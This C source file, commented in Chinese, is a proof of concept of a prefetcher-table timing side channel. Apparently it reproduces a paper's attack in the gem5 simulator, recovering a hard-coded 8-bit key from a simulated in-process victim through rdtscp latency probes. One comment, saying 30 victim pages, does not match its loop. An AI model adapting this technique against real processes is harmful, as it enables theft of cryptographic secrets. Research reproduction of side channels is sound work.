#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define XPT_SIZE 256
#define THRESHOLD 32
#define KEY_BITS 8

// 1. 内存隔离：增大缓冲区防止背景页干扰攻击目标
uint8_t memory[4096 * 4096] __attribute__((aligned(4096)));
uint8_t evict_buf[1024 * 1024]; // 用于清空 Cache

static inline uint64_t rdtscp() {
    uint32_t lo, hi;
    __asm__ volatile ("rdtscp" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

// 模拟论文中的“环境静默”：除了访存，不执行任何指令
void silent_flush_cache() {
    volatile uint8_t junk;
    for (int i = 0; i < 1024 * 1024; i += 64) junk = evict_buf[i];
    __asm__ volatile("mfence; lfence");
}

int main() {
    volatile uint8_t junk;
    uint8_t secret_key = 0x5c; 
    uint8_t guessed_key = 0;

    printf("Starting PrefetchX Noise-Isolation Attack...\n");

    for (int bit = 0; bit < KEY_BITS; bit++) {
        
        // // --- Step 0: 清理 XPT (统计消噪的前提：起点一致) ---
        // for (int f = 0; f < 300; f++) junk = memory[(3000 + f) * 4096];
        // __asm__ volatile("mfence");

        // --- Step 1: 训练 Phy-A1 (Page 1) ---
        for (int i = 0; i < THRESHOLD; i++) {
            junk = memory[0];
            __asm__ volatile("mfence; lfence");
        }

        // --- Step 2: 填充与标记 LRU ---
        // 关键：填入 240 条，留出 16 条作为“噪音缓冲区”
        // 论文在真实机上填 255 条，但 gem5 背景噪音约有 5-10 页
        for (int p = 1; p < XPT_SIZE; p++) {
            for (int k = 0; k < THRESHOLD; k++) {
                junk = memory[p * 4096];
            }
        }
        __asm__ volatile("mfence; lfence");

        // --- Step 3: 测量前的静默 ---
        silent_flush_cache(); 

        // --- Step 4: 受害者动作 (Victim Action) ---
        if ((secret_key >> bit) & 1) {
            // 受害者连续访问 30 个不同的页面，确保填满剩下的 16 个缓冲位并踢走 Phy-A1
            for (int v = 0; v < 1; v++) {
                junk = memory[(1024 + v) * 4096];
                __asm__ volatile("mfence");
            }
        }
        __asm__ volatile("mfence; lfence");

        // --- Step 5: 探测 (Probe) ---
        uint64_t start = rdtscp();
        junk = memory[0]; 
        uint64_t end = rdtscp();

        uint32_t lat = (uint32_t)(end - start);
        
        // 统计判定：给噪音留出阈值容错
        int guess = (lat > 330) ? 1 : 0;
        if (guess) guessed_key |= (1 << bit);
        
        // 只在每一轮结束打印，防止干扰硬件流
        printf("Bit %d | Latency: %u | Guess: %d\n", bit, lat, guess);
    }

    printf("Final Recovered Key: 0x%02x (Target: 0x5c)\n", guessed_key);
    fflush(stdout);
    return 0;
}